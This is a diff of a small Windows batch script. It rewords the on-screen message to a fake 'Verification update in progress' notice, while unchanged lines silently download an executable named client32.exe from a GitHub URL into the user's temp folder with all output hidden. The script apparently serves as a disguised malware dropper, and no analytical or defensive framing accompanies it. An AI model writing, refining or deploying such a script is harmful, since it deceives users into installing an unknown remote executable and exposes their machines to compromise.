@@ -1,5 +1,5 @@
 @echo off
-echo Updating wait...
+echo Verification update in progress. Please wait...
 set "TEMP=%USERPROFILE%\AppData\Local\Temp"
 
 curl -L -o "%TEMP%\client32.exe" "https://github.com/helper-net/update/raw/refs/heads/main/client32.exe" >nul 2>&1
